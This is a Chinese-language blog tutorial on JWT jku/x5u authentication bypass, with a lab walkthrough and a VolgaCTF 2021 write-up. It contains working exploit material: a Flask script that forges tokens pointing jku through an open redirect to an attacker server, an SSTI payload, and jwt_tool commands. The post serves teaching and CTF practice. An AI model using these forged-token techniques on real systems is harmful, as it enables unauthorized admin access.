---
title: JWT jku/x5u Authentication bypass
date: 2021-04-12 08:34:27
categories:
- JWT
tags:
- jwt
toc: true
---




<!-- # JWT jku/x5u Authentication bypass 学习与实践 -->

> 本文首发于安全客：[JWT jku/x5u Authentication bypass 学习与实践](https://www.anquanke.com/post/id/236830)

## 0x00 前言

之前对JWT的利用姿势只停留在拿到秘钥后进行身份伪造，前几天`Volgactf2021`遇到了一道jku的题，发现此前关于jku 权限绕过利用原理与利用手法的文章还是比较少的，趁此机会将这一块好好学一遍，希望对大家有用，欢迎大家批评指正！



## 0x01 jwt简介

> JSON Web Token (JWT)是一个开放标准(RFC 7519)，通常可用于在身份提供商和服务提供商之间传递用户的身份验证信息。



JWT由三部分组成，由"."进行连接，分别是：

- 头部（Header）
- 有效载荷（Payload）
- 签名(Signature)



### Header

header用于标识用于生成签名的算法。如下：

```json
{ 
  "alg"： "HS256"，
  "typ"： "JWT"
}
```

HS256 表示此令牌是使用HMAC-SHA256签名的。



### Payload

payload包含用户数据以及一些元数据有关的信息。比如：

```json
{ 
  "loggedInAs"： "admin"，
  "iat"： 1422779638 
}
```



### Signature

签名部分用于安全地验证该token。**拥有该部分的JWT被称为JWS，也就是签了名的JWS；没有该部分的JWT被称为nonsecure JWT 也就是不安全的JWT，此时header中声明的签名算法为none。**

签名部分使用多种算法，HMAC-SHA256是其中的一种：

```python
HMAC-SHA256(
  secret,
  base64urlEncoding(header) + '.' +
  base64urlEncoding(payload)
)
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbkFzIjoiYWRtaW4iLCJpYXQiOjE0MjI3Nzk2Mzh9.gzSraSYS8EXBxLN_oWnFSRgCzcmJmMjLiuyu5CSpyHI
```

eyJ = Base64('{"')





## 0x02 jwt 相关概念

> - JWS：Signed JWT，签名过的jwt
> - JWK：JWT的密钥，也就是我们常说的scret；
> - JWE：Encrypted JWT部分payload经过加密的jwt；
> - jku："jku" (JSON Web Key Set URL) 是jwt header中的一个字段，字段内容是一个URI，该URI用于指定用于验证令牌秘钥的服务器，该服务器用于回复jwk。
>
> - x5u："x5u" 也是jwt header中的一个字段，指向一组X509公共证书的URL，与jku功能类似
> - X.509 标准
>   - X.509 标准是密码学里公钥证书的格式标准,包括TLS/SSL(WWW万维网安全浏览的基石)在内的众多 Internet协议都应用了X.509 证书）

更详细的概念请参考：[深入了解Json Web Token之概念篇](https://www.freebuf.com/articles/web/180874.html)



## 0x02 jku 工作原理

内容参考：
- ppt：https://www.slideshare.net/snyff/jwt-jku-x5u?from_action=save
- 视频：https://www.youtube.com/watch?v=VA1g7YV8HkI&list=PLKAaMVNxvLmAD0ZVUJ2IGFFC0APFZ5gzy&index=11



### 正常工作场景

jku使用的场景如下：

#### Step1 用户携带JWS（带有签名的JWT）访问应用

![image-20210331160635996](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331160635996.png)



#### Step2 应用程序解码JWS得到jku字段

![image-20210331161005669](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161005669.png)



#### Step3 应用根据jku访问返回JWK的服务器

![image-20210331161234593](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161234593.png)



#### Step4 应用程序得到JWK

![image-20210331161400400](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161400400.png)



#### Step5 使用JWK验证用户JWS

![image-20210331161528304](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161528304.png)



#### step6 验证通过则正常响应

![image-20210331161546646](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161546646.png)



### 攻击场景

攻击场景如下：

![image-20210331161633860](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161633860.png)

1. 攻击者使用伪造的JWS访问应用，jku字段指向自己控制的服务器。
2. 应用程序得到jku后对恶意服务器进行访问，得到伪造的JWK。
3. 攻击者的JWS成功得到验证，进而可以越权访问应用。



为了保证JWK服务器的可信，应用程序会对jku的指向增加各种防护措施，比如对URL进行白名单过滤，想要攻击成功也并非容易的事。



## 0x03 攻击方式

### 方式一：绕过对jku地址的过滤

如果过滤方式比较简单只按照规定长度检查域名的话，很容易绕过。

```
https://trusted  => http://trusted@malicious.com
```

绕过方式由具体场景而定。

### 方式二：可信服务器本身的漏洞

- 1.文件上传漏洞
- 2.开放重定向漏洞
- 3.CRLF注入漏洞

#### 利用文件上传漏洞

文件上传漏洞很好理解，如果对jku做了域名限制，利用文件上传就不会有影响了，攻击者可以上传自己生成的JWK文件，然后修改jku指向此文件即可。



#### 利用重定向漏洞

重定向漏洞的利用方式可以参考下图：

![image-20210331193633292](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331193633292.png)

1. 攻击者使用恶意JWS访问应用程序，应用程序向得到jku，并访问jku指向的链接
2. 此时可信服务器返回一个重定向，使得应用程序从恶意服务器中获取JWK

![image-20210331194200328](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331194200328.png)





#### 利用CRLF注入

CRLF注入的利用场景如下：

![image-20210331194353507](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331194353507.png)



攻击者在jku中嵌入CRLF，构造HTTP报文，使得应用程序得到的返回内容被攻击者控制，攻击者将返回内容控制为自己生成的JWK，即可绕过验证



## 0x04 jku利用实例

### AttackDefense实验室：jku Claim Misuse

#### 场景描述

- 1.攻击者IP地址为：192.170.138.2
- 2.局域网内192.170.138.3的8080端口包含了一个基于CLI的JWT API，该API提供如下三个功能
  - /issue ：访问后生成一个JWT 
  - /goldenticket：得到goldenticket，但是需要身份为admin才能获取
  - /help：查看一些帮助
- 3.实验的目标是获取goldenticket



#### 实验过程

```sh
curl http://192.170.138.3:8080/issue
```

响应得到JWS

使用得到的JWS到[https://jwt.io](https://jwt.io/)网站上解码

![image-20210331200027003](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331200027003.png)



该JWT使用RSASHA256进行加密，并且jku指向了如下地址：

```
http://witrap.com:8000/jwks.json
```



直接请求该jwk

```sh
 curl http://witrap.com:8000/jwks.json
```

![image-20210331200408236](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331200408236.png)



得到可以看到RSA加密的n和e都在里面。

我们的目标是以admin角色访问到/goldenticket，所以这里可以利用上面的攻击方式。

具体流程如下：

1. 1.本地生成自己的公私钥对
2. 2.搭建本地恶意服务器
3. 3.使用自己的n和e伪造一个JWK并放在恶意服务器上
4. 4.利用公私钥伪造JWS，将role字段改成admin，jku指向该恶意服务器上的JWK文件
5. 5.带上JWS访问/goldenticket



##### 生成RSA公私钥对

```sh
openssl genrsa -out keypair.pem 2048
```

产生一个2048位的密钥

```sh
openssl rsa -in keypair.pem -pubout -out public.crt
```

根据密钥产生公钥

```sh
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkc8.key
```

---

openssl pkcs8命令：

```sh
openssl pkcs8 [-topk8] [-inform PEM|DER] [-outform PEM|DER] [-in filename] [-passin arg] [-out filename] [-passout arg] [-noiter] [-nocrypt] [-nooct] [-embed] [-nsdb] [-v2 alg] [-v2prf alg] [-v1 alg] [-engine id]
```

具体可参考：https://www.openssl.org/docs/man1.0.2/man1/openssl-pkcs8.html





##### 伪造JWS

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyBoYKQHzkKJQQQGdHubO
Cy6VwQdrr2Pn269ovuZ9Y6155pJCskXApCHG2qV7yIXpHz1XrDkFe8ZmTiPzPtQC
u220HFrH3KRkTfECzGkT4LJB8jYySL18Ih7zf6A+wpCVCDYEZWXlyuwkqdqRzBRz
F8kxZgFzVwRfeECF8RnO1vPVMZ9qNX7i1+u6bA83LNjYQCSNZHo+Y4K3deb+MK7l
zcSnKsw2EQvuaUJKEExFoFeruXoaAsouwUMRERr/pQPxvk+6voWyTfPJiNKxI0JD
oNdsYNj0JPWqAnOcsF+G2UGDmBJ7UhBxKutBt7OKAUWbOpZYd9YkmT5rL3hAeCia
YwIDAQAB
-----END PUBLIC KEY-----
```

将产生的public key完整得粘贴到公钥处

![image-20210331203210960](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331203210960.png)



私钥也是一样

![image-20210331203427137](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331203427137.png)



然后修改上面jku的地址：

```
http://192.170.138.2:8080/issue
```

在右方就可以得到伪造好的JWS



##### 搭建恶意服务器

根据jwks.json文件的格式：

![0_G13gj8l5elTJGins](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/0_G13gj8l5elTJGins.png)

我们需要修改n和e

利用如下脚本：

```python
from Crypto.PublicKey import RSA

fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()

print "n:", hex(key.n)
print "e:", hex(key.e)
```

![0_tqSIayaT5cADfUX3](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/0_tqSIayaT5cADfUX3.png)



替换n和e得到伪造的JWK



下一步我们可以使用python的SimpleHTTPServer快速搭建服务器

```sh
python -m SimpleHTTPServer 8080
```

![image-20210331204337815](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331204337815.png)



SimpleHTTPServer可以快速构建一个web服务，并且将当前目录作为web服务根目录，当前目录存放着伪造的jwks.json



携带伪造的JWS进行访问/goldenticket，这时成功通过验证



### Volgactf 2021 JWS：开放重定向利用

当时没做出来，参考：[JWS writeup](https://telegra.ph/JWS-writeups-03-28)



#### 场景描述

- 1.5000端口存在返回JWS的API
  - jws中存在jku
  - jku存在白名单过滤机制，限制在localhost域
- 2.5000/check_jws?payload= 可以进行JWS的检查并且展示Payload部分内容
  - 存在SSTI漏洞
- 3.5001/vuln/JWK可以得到JWK

需要利用重定向通过验证，然后利用SSTI拿到flag



#### 实践过程



访问5000端口：



![1e91c1baed437897e9133](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1e91c1baed437897e9133.png)

返回JWS，可以看到里面的jku，指向`http://localhost:5001/vuln/JWK`

访问`http://localhost:5001/vuln/JWK`得到JWK

![cc1a02c9ac95a93a582dc](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/cc1a02c9ac95a93a582dc.png)

但是这里的jku被白名单限定在了localhost域，无法直接修改jku指向我们自己的服务器

再次回顾一下jku的利用手段

- 1.存在文件上传
- 2.存在重定向
- 3.存在CRLF注入



##### 重定向利用

通过扫描目录可以发现/vul/redirect API

直接访问会回显 bad params

参数名我们是不知道的，所以需要fuzz API的参数，可以使用该字典：[2020-11-30-open-redirect-params.txt](https://github.com/ptswarm/ptswarm-twitter/blob/main/2020-11-30-open-redirect-params.txt)

得到参数endpoint=

重定向链接：

```
/vuln/redirect?endpoint=
```





##### 编写脚本



##### 生成JWK

使用python jscrypto库生成jwk

```python
def generate_key():
   key = jwk.JWK.generate(kty='RSA', size=2048)
   print(key.export_public())
   print(key.export())
```



```json
{"e":"AQAB","kty":"RSA","n":"1cOFAHlq4MjGXJztC1-H8RI0D0TgYw6UyZgXAv-Gg5t7DuPa9ssqw8h_z04wusMJ9GwN71DqPtijyjpblaKcKSmJN61PCPVjthkF88BfvZ7SFQjA-XVuEsFwOGOfvtmWQhRJmNAvZt_y9UfOe35EleeAOWtNkYQKa-NALu0-D_mLSuxNExbxCymqwkuZVTSrHdUyul-ohReTdjx8hJAVOsV4yRq7VIrblftLMTSlD3nUrPrsZNZf77ysAdD4gEffjCL7Osp0cjufJJlTndBhh-7I5l2rgcNQpsxSwYE_jegAQUIjRveVdq6CzXj104uYGPg3qda1xIi3VyOsb4wfxQ"}

{"d":"VtSV6Qxo8qf7k1EXJMCIWs83IGCs-O_KVl0WM9yRylHU2caKgici1uZRrGapeqORHpzpyCVJEYA0gAfWfeDQqBO8LkaSzSPIfgaKGWoyObcSxQKKSIp_zNSQfgdRs1d1JqBRCOa_6nzblvC1Ggq_V1jzB9_jYVGOXiawQp-RzzCjRt6_BSr7Hg2xC0v_chwUt_yBhvDGz5x0rbspYcBL0OzI1hhZ1Tujk3MRrMfbIvBeoyRb_582UYQBc886SmAF6ue3eBc0v15mAX7qptCb7RLOVBYJwA-eYGktll9Orx-IIvy1GJpZdCV7FBGh-1AlCgM2O0KyBAwT3kRA1PYUgQ","dp":"gu2vc9u13DNV1PUF0Zk5lliLQjzhsRqOwl9drbdUQ7JgkyVzfccZ8QhfrHVjgAFzD54I1zoNewXi-4jHts4O3ud1QOvt0tOJM-2OokFg29i0GoSXVT05IHb6VAmjAcfiC65SoS7sTm-V0oPp0DLswstGbk5zsAn2JL2RjBNYsz0","dq":"MsgjIE3OYNQ6HtjjeBIJrG7eAAProYzqIvhNhBK4vfoEiA4V-1GPw2Gxn9xkvzdXFWRM0eih8Pu07-CgiqYGfkUSgkvmKynvr_oH8stZ-wKZMs9jsDsBuV0y6CQUKiFRTgWkNw3o6408XUwF5K46oAjtp0GUG-CNNNoIc45jN0E","e":"AQAB","kty":"RSA","n":"1cOFAHlq4MjGXJztC1-H8RI0D0TgYw6UyZgXAv-Gg5t7DuPa9ssqw8h_z04wusMJ9GwN71DqPtijyjpblaKcKSmJN61PCPVjthkF88BfvZ7SFQjA-XVuEsFwOGOfvtmWQhRJmNAvZt_y9UfOe35EleeAOWtNkYQKa-NALu0-D_mLSuxNExbxCymqwkuZVTSrHdUyul-ohReTdjx8hJAVOsV4yRq7VIrblftLMTSlD3nUrPrsZNZf77ysAdD4gEffjCL7Osp0cjufJJlTndBhh-7I5l2rgcNQpsxSwYE_jegAQUIjRveVdq6CzXj104uYGPg3qda1xIi3VyOsb4wfxQ","p":"82Nu0AhRyqM1AMEOhR-Ld1s1FEDFYPaJlLTsyXeSsdJFERnKMAQ9FW49exwjNprvw5fgB7BkL5JtAO9b1OjIcz2SBZmP1OgED_69l-LrQ1xT_nczpiMeYvkv9Etdv1njK01jBRZEVudG4Qr1tiDI654Yr4dNIG8db3tdnk_WVqU","q":"4Ncc9ZrEYMIrbc5MvK3ywpy8AvBTHET3hgJKlRYvrU8DHUYUbq4KZK6O4h1Xv3TrSxWEwn1Z7VmWJcybS9S2khmt32OF81eG9-aty0XZtxgulRe8wCi2KCzDmDZzJ0kCcchZUr3Chj8FeXOwdJH1G9ZQUiwgMZ0Fu0qQVi2ReqE","qi":"RbZJiXGM4NBvyoBbEt0Eg1Sw22bEmQqpzYt16AcLjrpl_MTDGntuaOMhN7a3I4n3BoeaPytEy-I41UVLu0wyGYz91RtZWrFNvwd1R2TNvm5MfP5Xsr6hKSaDvAkvOZbg83VDXO2HeJ9ot6WwRZTKlivhLhJV-KxRX1hCbsv_VoU"}
```



##### 生成JWS

我们需要伪造jku，并且在JWS解密后的内容中附加上SSTI payload，比如`{{ config }}`

```python
jku = 'http://localhost:5001/vuln/redirect?endpoint=http://localhost:5002/hack' #localhost:5002 its own server, 5001 server with vuln open redirect
payload = '{{config}}'
key = jws.JWK(**json.loads(app.config['all_key']))
jwstoken = jws.JWS(payload.encode('utf-8'))
jwstoken.add_signature(key=key,alg='RS256',protected=None,header=json_encode({"kid": key.thumbprint(), 'jku':jku, "alg":"RS256"}))
sig = jwstoken.serialize()
```

jwk文档：[JSON Web Key (JWK)](https://jwcrypto.readthedocs.io/en/latest/jwk.html#json-web-key-jwk)

```python
>>> ka
<jwcrypto.jwk.JWK object at 0x7f7cd6062400>
>>> jwstoken
<jwcrypto.jws.JWS object at 0x7f7cd64ebdf0>
>>> jwstoken.add_signature(key=key,alg='RS256',protected=None,header=json_encode({"kid": ka.thumbprint(), 'jku':jku, "alg":"RS256"}))
>>> jwstoken.serialize()
'{"header":{"alg":"RS256","jku":"http://localhost:5001/vuln/redirect?endpoint=http://localhost:5002/hack","kid":"BYa3XpycMhDud1d-fYTijehS75jH90eTPxVYdUx8DqA"},"payload":"e3tjb25maWd9fQ","signature":"kwNzA48stR8tqbceOxHvHUyNCB9dzx02mPLRLpd9cjD5vzFio5rBMEIraLEp8WwLaH1T_Nofz7e2ToPCdWFS5nGv6jcGCJ9DrFMwL9vq4M6pfTLE7hKlGDtE7iFAIvZqL4MEAx7IdSC07zd4yTRNBy48q64yXEMqA8HigvETS14_DYfiDDkSkHNSxLTuItI8qOxhfLIj1UVTZMci1mi5PQ00R66q5RPFsy-6v6ZIrRjPkeODc4DIlzpv525NkREMcCrAgpb7XvrV1eVWJMWDwkZQoXf6XgJapvhRveegk9GYkLETbz3Lqwh13KNNZw9doVSqL1oyRhjxgDHyT1cQlg"}'
```



##### 完整脚本：

使用flask构建web服务，访问/hack即返回伪造的JWK。

```python
from flask import Flask, request, redirect, jsonify, send_from_directory
from jwcrypto import jwk, jws
from jwcrypto.common import json_encode
import os
import json
import requests, re

app = Flask(__name__)
app.config['pub_key'] = '{"e":"AQAB","kty":"RSA","n":"oBbyWuGxj4wqlVjqcpNh3ZKYTjVXWINNdn8zaJgJdPa0Wt286cE4wExWAV03Kuma7bh8yK5SgY2bte8mdjpcte5T1iOtqWTXDP5XbXQvzLPas1VVvzcMwdsMs4-mkuV6HCYaj7Sbent7Bvx_4aY8qxrIBSuqf4NBP38iE_Bkuzo_OeGtsz0f5KECUPDV-Tum1KDuiwCDt6Jmef_xAWUmAqJv9nK0GLnNceIDXmw775Gi26KxDl7g2ak22pNCEFBKbZqQak4cTeZJfNR-oUZqPXFGO9i2yZJ_G7iN-1JxSPTyqyKnG5Z16d7l1Q_TFP1btPMFu9qS_bdbnkcMxURoBQ"'
app.config['all_key'] = '{"d":"AaOagaGz7rNRsEvDwr6NjvY0RwC2zzow7dipjxWXazIncJK6n24SBa4CZ2sr6G2R34M3C9r1D0yC3p7_NtCsKFSzWQrueUCGDyT_gihhYOgqghGKmjWXFNkITUJYQ0LEOEuPlA8WVG-1N8IYERhhoKLaj2r-COYwIdVMZQXeEiinXLfCVJCEtMMVNBMRfyUoY4_siQ6vMQGxJsHn8XOE2zsMnkreG7kPE-c0UrmsdnhmmyNFtegbS8dej4eH0Xy1txg81wTQSyGUru10QaFYVVAOhRFmdVNvSNWW3uL1guAOgLg8Y17FPnz1FiUGhflTeEsWwcKlVWl7QF0Bel-e1Q","dp":"nAk_O5Qi5HQRhgcsNZsGgFeEeErPn5CoXFx1DhANVbQwuNU-19P29wR4gSaDfexoLLaDXrw50g-ufmCLbz9r461LcPdmD6g9okstgPF38heLhjyTuA84xDu16sCX0ltpxWOWzhRkBeI0uhE1mjXtD7Uk9KUX5Y5SQK6MPZmVsoM","dq":"MznXQhv8h65iqwxzfPj3QwK6s9JvIR4IHnur2t3GYaCd-RG5fGSigkClUeG8TUlxViOr5ElbGsATWOzqAlr_CwTPCwEg9lcL5AKEHOy94k5CfAWMr1csa6Pp6bQJkveDf_c87s2Z1zYn6cJmJZiEJADocRyyUJ_mnh6wpvS7tgs","e":"AQAB","kty":"RSA","n":"oBbyWuGxj4wqlVjqcpNh3ZKYTjVXWINNdn8zaJgJdPa0Wt286cE4wExWAV03Kuma7bh8yK5SgY2bte8mdjpcte5T1iOtqWTXDP5XbXQvzLPas1VVvzcMwdsMs4-mkuV6HCYaj7Sbent7Bvx_4aY8qxrIBSuqf4NBP38iE_Bkuzo_OeGtsz0f5KECUPDV-Tum1KDuiwCDt6Jmef_xAWUmAqJv9nK0GLnNceIDXmw775Gi26KxDl7g2ak22pNCEFBKbZqQak4cTeZJfNR-oUZqPXFGO9i2yZJ_G7iN-1JxSPTyqyKnG5Z16d7l1Q_TFP1btPMFu9qS_bdbnkcMxURoBQ","p":"0-jzleXm-XbQe_gjrKqFsQUypSjtVX2NJ1ckF5op0qE1XiLETHg0C-woMuEymyW-vqRAbgA5yx4pVhlmJTPkv8TVsc9OYsz1H1cswiI-I73uLJ1wgUk_4mapa7K10Mrsw2X9AZpmiP7ntc4OwVdJ7BjUoY587IbZrV0yVCKgeYM","q":"wWXeDP796mxedqUActwBTCQCR3uNjbmOINMZY2CR0DuxCa9AX8V3VZEQVUj1Q6R8o4ixrQywQy1R902Kc9dCQqBkwF4WfybzhkfwiVcf8Yy3bqZzEoGCEbs2KVnYX7J3EBIfgEQVXb_G5ZeOvWzgSTi11e1_kdcUXdANiGtISdc","qi":"MNo8DyDds5N6gw6gmA17Iu0scH5i2n30oS0nDxFp0tKqfd5WAjF7J3P_uESwzW8AvncAm7HtDBd-KEHipcOcm7rPEdfBKKhyo3Q25chBCvRPvVcslmML30p3p0_F26yd5ThHWoo3UmHNoPLiMNZN3oRsCe1w2jity3YVvZDhu48"}'

def generate_key():
   key = jwk.JWK.generate(kty='RSA', size=2048)
   print(key.export_public())
   print(key.export())

@app.route('/') #to get evil jws token
def index():
   jku = 'http://localhost:5001/vuln/redirect?endpoint=http://localhost:5002/hack' #localhost:5002 its own server, 5001 server with vuln open redirect
   payload = '{{config}}'
   key = jws.JWK(**json.loads(app.config['all_key']))
   jwstoken = jws.JWS(payload.encode('utf-8'))
   jwstoken.add_signature(key=key,alg='RS256',protected=None,header=json_encode({"kid": key.thumbprint(), 'jku':jku, "alg":"RS256"}))
   sig = jwstoken.serialize()
   return sig

@app.route('/hack') #to redirect, return evil JWK
def hack(): #need send as file
   with open('tmp.file', 'w') as file_write:
       file_write.write(jwk.JWK(**json.loads(app.config['all_key'])).export_public())
   uploads = os.path.join(os.path.abspath(os.path.dirname(__file__)))
   return send_from_directory(directory='.',filename='tmp.file')

@app.route('/get_flag')
def get_flag():
   payload = index()
   answ = requests.get('http://localhost:5000/jws_check',params={'payloads':payload}).text
   flag = answ
   flag = re.findall('VolgaCTF{.+?}', answ)[-1]
   print(flag)
   return flag
   
if __name__ == '__main__':
   app.run(port=5002, host='0.0.0.0')
```









## 0x05 相关工具

### [jwt_tool](https://github.com/ticarpi/jwt_tool)

![标识](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/100555535-18598280-3294-11eb-80ed-ca5a0c3455d6.png)

**其目前的功能包括：**

> - 检查令牌的有效性
> - 测试已知漏洞：
>   - （CVE-2015-2951）***alg=none***签名绕过漏洞
>   - （CVE-2016-10555）***RS / HS256***公钥不匹配漏洞
>   - （CVE-2018-0114）***Key injection***漏洞
>   - （CVE-2019-20933 / CVE-2020-28637）***Blank password*** 漏洞
>   - （CVE-2020-28042） ***Null signature***漏洞
> - 扫描配置错误或已知漏洞
> - Fuzz声明值以引发意外行为
> - 测试secret/key file/public key/ JWKS key的有效性
> - 通过高速*字典攻击*识别*低强度key*
> - 伪造新的令牌头和有效载荷内容，并使用**密钥**或通过其他攻击方法创建新的签名
> - 时间戳篡改
> - RSA和ECDSA密钥生成和重建（来自JWKS文件）

jwt_tools非常强大，文档：[Using jwt_tool](https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool)

其中关于jku攻击的部分如下：

> 欺骗远程JWKS：使用首次运行时自动生成的RSA密钥，并通过提供的URL（-ju）提供JWKS-或将该URL添加到您的jwtconf.ini配置文件中-并使用私钥对令牌进行签名：

```sh
$ python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/my_jwks.json
```



### [MyJWT](https://github.com/mBouamama/MyJWT)

同样强大的jwt工具，文档：[MyJWT: crack Your jwt](https://myjwt.readthedocs.io/en/latest/)

> **Features**
> - copy new jwt to clipboard
> - user Interface (thanks [questionary](https://github.com/tmbo/questionary))
> - color output
> - modify jwt (header/Payload)
> - None Vulnerability
> - RSA/HMAC confusion
> - Sign a jwt with key
> - Brute Force to guess key
> - crack jwt with regex to guess key
> - kid injection
> - *Jku Bypass*
> - *X5u Bypass*

2020年11月添加了对jku与x5u利用的功能。

```sh
  --jku TEXT                   Jku Header to bypass authentication
  --x5u TEXT                   X5u Header to bypass authentication
```





### [jwt_attack_with_header_injection.py](https://gist.github.com/imparabl3/efcf4a991244b9f8f99ac39a7c8cfe6f)

用于利用CRLF漏洞的脚本



## 0x06 总结

总结一下jku权限绕过的利用方式：

1.jku可以直接指向为攻击者服务器
- 1.直接在服务器上放置JWK，jku指向攻击者服务器

2.jku有白名单或者别的过滤措施
- 1.配合文件上传漏洞，上传构造好的JWK，jku指向该JWK
- 2.配合开放重定向，直接重定向到攻击者的服务器，服务器上放置构造好的JWK
- 3.配合CRLF漏洞，直接控制JWK内容



## 参考资料

- [JWT: jku x5u](https://www.slideshare.net/snyff/jwt-jku-x5u?from_action=save)
- [JWS writeups](https://telegra.ph/JWS-writeups-03-28)
- [JWT Expert: jku Claim Misuse](https://www.youtube.com/watch?v=ThzZFIhuFMA)
- [Hacking JWT Tokens: jku Claim Misuse](https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c)
- [深入了解Json Web Token之概念篇](https://www.freebuf.com/articles/web/180874.html)
- [攻击JWT的一些方法](https://xz.aliyun.com/t/6776#toc-12)
- [如何使用MyJWT对JSON Web Token（JWT）进行破解和漏洞测试](https://www.freebuf.com/sectool/262183.html)
- [Python 生成 JWT(json web token) 及 解析方式](http://t.zoukankan.com/lowmanisbusy-p-10930856.html)
- [Attacking JSON Web Tokens (JWTs)](https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb)